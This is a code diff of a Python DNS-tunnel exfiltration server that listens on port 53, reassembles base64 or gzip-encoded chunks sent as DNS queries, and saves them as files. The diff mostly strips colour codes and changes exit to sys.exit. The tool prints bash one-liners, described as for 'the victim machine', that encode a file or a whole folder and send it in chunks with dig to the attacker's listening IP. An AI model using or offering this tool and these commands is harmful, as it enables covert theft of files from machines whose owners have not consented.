@@ -9,9 +9,6 @@ import re
 import base64
 
 RED = "\033[1;31m"
-GREEN = "\033[1;32m"
-YELLOW = "\033[1;33m"
-BLUE = "\033[1;34m"
 RESET = "\033[0m"
 
 VERSION = "2.0"
@@ -27,7 +24,7 @@ class DNSQuery:
             ini = 12
             lon = ord(data[ini])
         while lon != 0:
-            self.data_text += data[ini + 1:ini + lon + 1] + "."
+            self.data_text += data[ini + 1 : ini + lon + 1] + "."
             ini += lon + 1
             lon = ord(data[ini])
 
@@ -66,22 +63,22 @@ def save_to_file(r_data, z, v):
                 f.read()
         except IOError:
             print(f"{RED}[Error]{RESET} Opening file {fname} to save data.")
-            exit(1)
+            sys.exit(1)
 
         try:
             if v:
-                print(f"{YELLOW}[Info]{RESET} base64 decoding data ({key}).")
+                print(f"[Info] base64 decoding data ({key}).")
             flatdata = base64.b64decode(
                 flatdata
             )  # test if padding correct by using a try/catch
         except (ValueError, TypeError):
             f.close()
             print(f"{RED}[Error]{RESET} Incorrect padding on base64 encoded data..")
-            exit(1)
+            sys.exit(1)
 
         if z:
             if v:
-                print(f"{YELLOW}[Info]{RESET} Unzipping data ({key}).")
+                print(f"[Info] Unzipping data ({key}).")
 
             try:
                 x = zlib.decompressobj(16 + zlib.MAX_WBITS)
@@ -90,19 +87,19 @@ def save_to_file(r_data, z, v):
                 print(
                     f"{RED}[Error]{RESET} Could not unzip data, did you specify the -z switch ?"
                 )
-                exit(1)
+                sys.exit(1)
 
-            print(f"{YELLOW}[Info]{RESET} Saving recieved bytes to './{fname}'")
+            print(f"[Info] Saving recieved bytes to './{fname}'")
             f.write(flatdata)
             f.close()
         else:
-            print(f"{YELLOW}[Info]{RESET} Saving bytes to './{fname}'")
+            print(f"[Info]{RESET} Saving bytes to './{fname}'")
             f.write(flatdata)
             f.close()
 
         with open(fname, "r") as f:
             md5sum = hashlib.md5(f.read()).hexdigest()
-            print(f"{GREEN}[md5sum]{RESET} {md5sum}")
+            print(f"[md5sum] {md5sum}")
 
 
 def usage(str=""):
@@ -121,7 +118,7 @@ def usage(str=""):
     )
     print("-f\tLength reserved for filename per request    (default = 17)")
     print("\n")
-    print(f"{GREEN}$ python {sys.argv[0]} -z 127.0.0.1{RESET}")
+    print(f"$ python {sys.argv[0]} -z 127.0.0.1")
     print("\n")
     print(
         f"{RED}-------- Do not change the parameters unless you understand! --------{RESET}"
@@ -146,29 +143,25 @@ def usage(str=""):
 
 def p_cmds(s, b, ip, z):
 
-    print(
-        f"{GREEN}[+]{RESET} On the victim machine, use any of the following commands:"
-    )
-    print(
-        f"{GREEN}[+]{RESET} Remember to set {YELLOW}filename{RESET} for individual file transfer."
-    )
+    print("[+] On the victim machine, use any of the following commands:")
+    print("[+] Remember to set filename for individual file transfer.")
     print("\n")
 
     if z:
-        print(f"{YELLOW}[?]{RESET} Copy individual file (ZIP enabled)")
+        print("[?] Copy individual file (ZIP enabled)")
         print(
-            f"""{RED}\x23{RESET} {YELLOW}f=file.txt{RESET}; s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
+            f"""{RED}\x23{RESET} f=file.txt; s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
         )
-        print(f"{YELLOW}[?]{RESET} Copy entire folder (ZIP enabled)")
+        print("[?] Copy entire folder (ZIP enabled)")
         print(
             f"""{RED}\x23{RESET} for f in $(ls .); do s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
         )
     else:
-        print(f"{YELLOW}[?]{RESET} Copy individual file")
+        print("[?] Copy individual file")
         print(
-            f"""{RED}\x23{RESET} {YELLOW}f=file.txt{RESET}; s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
+            f"""{RED}\x23{RESET} f=file.txt; s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
         )
-        print(f"{YELLOW}[?]{RESET} Copy entire folder")
+        print("[?] Copy entire folder")
         print(
             f"""{RED}\x23{RESET} for f in $(ls .); do s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
         )
@@ -201,13 +194,13 @@ if __name__ == "__main__":
 
     if "-h" in sys.argv or len(sys.argv) < 2:
         usage()
-        exit(1)
+        sys.exit(1)
 
     ip = sys.argv[1]
 
     if re.match(regx_ip, ip) is None:
         usage("{RED}[Error]{RESET} First argument must be listen address.")
-        exit(1)
+        sys.exit(1)
 
     if "-z" in sys.argv:
         z = True
@@ -231,15 +224,15 @@ if __name__ == "__main__":
         udp.bind((ip, 53))
     except socket.error:
         print(f"{RED}[Error]{RESET} Cannot bind to address {ip}:53")
-        exit(1)
+        sys.exit(1)
 
-    print(f"{GREEN}[+]{RESET} DNS listening on {ip}:53'")
+    print(f"[+] DNS listening on {ip}:53'")
     p_cmds(s, b, ip, z)
-    print(f"{GREEN}[+]{RESET} Once files have sent, use Ctrl+C to exit and save.\n")
+    print("[+] Once files have sent, use Ctrl+C to exit and save.\n")
 
     try:
         r_data = {}
-        while 1:
+        while True:
             # There is a bottle neck in this function, if very slow PC, will take
             # slightly longer to send as this main loop recieves the data from victim.
 
@@ -266,9 +259,9 @@ if __name__ == "__main__":
             if fname not in r_data:
                 r_data[fname] = []
 
-            print(f"{YELLOW}[>]{RESET} len: '{len(p.data_text)} bytes'\t- {fname}")
+            print(f"[>] len: '{len(p.data_text)} bytes'\t- {fname}")
             if v:
-                print(f"{BLUE}[>>]{RESET} {p.data_text} -> {ip} :53")
+                print(f"[>>] {p.data_text} -> {ip} :53")
 
             for d in tmp_data:
                 r_data[fname].append(d)
